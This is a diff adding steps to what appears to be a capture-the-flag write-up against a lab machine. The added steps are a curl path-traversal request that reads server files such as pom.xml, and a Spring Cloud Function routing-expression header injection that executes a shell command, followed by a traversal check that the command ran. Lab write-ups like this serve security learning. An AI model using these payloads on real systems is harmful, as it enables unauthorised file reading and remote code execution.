@@ -189,6 +189,8 @@ cool, we can read the ```/etc/passwd``` file. I went ahead to check the ```/var/
 
 Checking the contents of this directory I found a ```pom.xml``` file which contains a vulnerable dependency for the springframework
 
+>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../var/www/WebApp/pom.xml
+
 ![image](https://user-images.githubusercontent.com/67879936/224529421-593d88e8-6c4c-437e-962c-3c449907a24b.png)
 ![image](https://user-images.githubusercontent.com/67879936/224529460-c9b842fe-37bf-4475-9820-a1b851d797cc.png)
 
@@ -202,7 +204,19 @@ Lets go ahead and exploit this
 
 <h2>Exploitation</h2>
 
+command: ```curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v ```
 
+This is meant to create a file named ```pwned``` in the ```/tmp``` directory
+
+![image](https://user-images.githubusercontent.com/67879936/224529802-cbac7868-d0c5-42ef-8de7-cfb1d9758ab4.png)
+
+Now, lets go ahead and check if the file is already in our ```/tmp``` directory
+
+>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../tmp
+
+![image](https://user-images.githubusercontent.com/67879936/224529948-ca73cf8a-ca95-4820-a952-78cf69def285.png)
+
+cool, this means our exploit worked
 
 
 
